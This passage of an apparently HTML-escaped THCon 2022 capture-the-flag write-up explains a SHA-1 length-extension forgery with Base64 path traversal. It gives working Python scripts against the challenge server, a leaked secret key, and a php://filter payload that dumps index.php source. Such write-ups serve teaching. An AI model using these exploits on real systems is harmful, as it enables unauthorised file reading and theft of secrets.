&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(joined_buf_hash)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Add 23 &amp;amp;quot;A&amp;amp;quot;s to simulate the SHA-1 block creation with the salt, but remove the salt since it&amp;amp;#39;ll be added by the server.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;joined_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pad((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;A&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;salt_len) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;block_1_buf)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[salt_len:] &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_2_buf
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;encoded_joined_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;urllib.parse.quote_plus(joined_buf)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(encoded_joined_buf)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests.get(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;pHash=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(encoded_joined_buf, joined_buf_hash)).content)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;In the code above we use the &amp;quot;view_profile&amp;quot; page (encoded as &amp;lt;code&amp;gt;dmlld19wcm9maWxl&amp;lt;&amp;#x2F;code&amp;gt; in Base64) along with the salted hash (&amp;lt;code&amp;gt;7b6f8b016f25da478b9f28f878aa3be8cced66fd&amp;lt;&amp;#x2F;code&amp;gt;) from the site URL. We pad that to a SHA-1 block (64 bytes including the salt, first byte after data is 0x80 and last 2 bytes are length) and add a 2nd block: &amp;lt;code&amp;gt;aaa + base64(&amp;quot;&amp;#x2F;..&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;phpinfo&amp;quot;)&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;We add 3 bytes (&amp;lt;code&amp;gt;&amp;quot;aaa&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt;) because the last byte of the previous SHA-1 block (as you can see below - 0x38 in yellow) is identified by PHP as a Base64 data byte. Aligning that to 4 bytes makes the following Base64-encoded string correctly readable (since Base64 is read aligned to 4 bytes).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The result &amp;lt;code&amp;gt;joined_buf&amp;lt;&amp;#x2F;code&amp;gt; which we were able to sign (before URL encoding) is:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;4.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The first part (green) is the original Base64-encoded string (containing &amp;quot;view_profile&amp;quot;). The red &amp;lt;code&amp;gt;0x80&amp;lt;&amp;#x2F;code&amp;gt; is the end-of-string marker added in SHA-1. Afterwards, the white &amp;lt;code&amp;gt;0x00&amp;lt;&amp;#x2F;code&amp;gt; bytes are padding to complete the first chunk to 64 bytes (taking into account that 23 bytes were also used for salt and 2 bytes are used for length). The yellow &amp;lt;code&amp;gt;0x01 0x38&amp;lt;&amp;#x2F;code&amp;gt; is chunk length in bits. It equals 0x138 = 312 bits = 39 bytes which is calculated by: &amp;lt;code&amp;gt;len(&amp;quot;dmlld19wcm9maWxl&amp;quot;) + key_length = 16 + 23 = 39&amp;lt;&amp;#x2F;code&amp;gt;. The next 3 blue-colored &amp;lt;code&amp;gt;0x61&amp;lt;&amp;#x2F;code&amp;gt; bytes are the padding I mentioned previously to align our Base64 string for PHP. The rest of the purple bytes are the Base64 payload.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When PHP receives this payload with a valid hash - it parses the Base64-encoded path as: &amp;lt;code&amp;gt;view_profile&amp;amp;lt;unprintable characters&amp;amp;gt;&amp;#x2F;..&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;phpinfo&amp;lt;&amp;#x2F;code&amp;gt; - which will be resolved into &amp;lt;code&amp;gt;phpinfo&amp;lt;&amp;#x2F;code&amp;gt; and appended by the app logic with &amp;lt;code&amp;gt;.php&amp;lt;&amp;#x2F;code&amp;gt;. Now we got to read what’s in &amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt;!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;phpinfo&amp;quot;&amp;gt;phpinfo&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;If you’re unfamiliar with &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.php.net&amp;#x2F;manual&amp;#x2F;en&amp;#x2F;function.phpinfo.php&amp;quot;&amp;gt;&amp;lt;code&amp;gt;phpinfo()&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;a&amp;gt; - it’s a built-in function that prints useful information about PHP and the environment it’s running on. Here’s how it looks like when running from our exploited URL (&amp;lt;code&amp;gt;phpinfo.php&amp;lt;&amp;#x2F;code&amp;gt; simply calls &amp;lt;code&amp;gt;phpinfo()&amp;lt;&amp;#x2F;code&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;5.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;
Within this page I found a good lead - the key used as the SHA-1 salt! The key was shown here because it’s defined as a PHP variable:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;thcon-2k22-ctf-local-card-maker-writeup&amp;#x2F;6.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;
But this key isn’t enough to retrieve the flag from &amp;#x2F;flag.txt - we can’t load a .txt file since the &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt; loader code appends &amp;lt;code&amp;gt;.php&amp;lt;&amp;#x2F;code&amp;gt; to every Base64 payload we give it.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;bonus-leaking-index-php-file-contents&amp;quot;&amp;gt;Bonus - Leaking index.php File Contents&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I wanted to make sure I understand how &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt; works internally, so equipped with the secret key I leaked the content of index.php:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;base64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;hashlib
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;php_file &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;index&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;path &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;php:&amp;#x2F;&amp;#x2F;filter&amp;#x2F;convert.base64-encode&amp;#x2F;resource=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(php_file,)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;Thcon_SuP3r_S3cr4t_K3y!&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;base64.encodebytes(path).replace(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\n&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hashlib.sha1(key_salt &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf).hexdigest()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;buf.decode()
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(requests.get(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;challenges1.thcon.party:2001&amp;#x2F;index.php?page=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;amp;pHash=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;%s&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(buf, buf_hash)).content)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The result is Base64-encoded &amp;lt;code&amp;gt;index.php&amp;lt;&amp;#x2F;code&amp;gt;. Here it is after decoding, to better understand how this challenge works:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;&amp;amp;lt;?php
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;session_start&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;();
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;require&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;crypto.php&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$safe_handler &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;new &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;IntegrityHandler&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_SERVER[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;SECRET_KEY&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;], &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;sha1&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;define&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;LOCAL_ACCESS&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;function &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;createHeaders&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($pArray, $handler){
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;lt;a href=&amp;amp;quot;&amp;#x2F;&amp;amp;quot;&amp;amp;gt;&amp;amp;lt;li&amp;amp;gt;Home&amp;amp;lt;&amp;#x2F;li&amp;amp;gt;&amp;amp;lt;&amp;#x2F;a&amp;amp;gt;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;foreach&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($pArray &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;as &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$p &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;amp;gt; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$v){
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;		&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;lt;a href=&amp;amp;#39;&amp;#x2F;index.php?page=&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;base64_encode&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($p) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;.&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;amp;pHash=&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$handler-&amp;amp;gt;secure_data(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;base64_encode&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($p)) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;. &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;#39; &amp;#x2F;&amp;amp;gt;&amp;amp;lt;li&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$v&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;lt;&amp;#x2F;li&amp;amp;gt;&amp;amp;lt;&amp;#x2F;a&amp;amp;gt;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;	}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;?&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;html&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;head&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;link &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;rel=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;stylesheet&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;href=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;https:&amp;#x2F;&amp;#x2F;maxcdn.bootstrapcdn.com&amp;#x2F;bootstrap&amp;#x2F;3.3.7&amp;#x2F;css&amp;#x2F;bootstrap.min.css&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#83a598;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-weight:bold;color:#8ec07c;&amp;quot;&amp;gt;link &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;rel=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;stylesheet&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;type=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;text&amp;#x2F;css&amp;amp;quot; 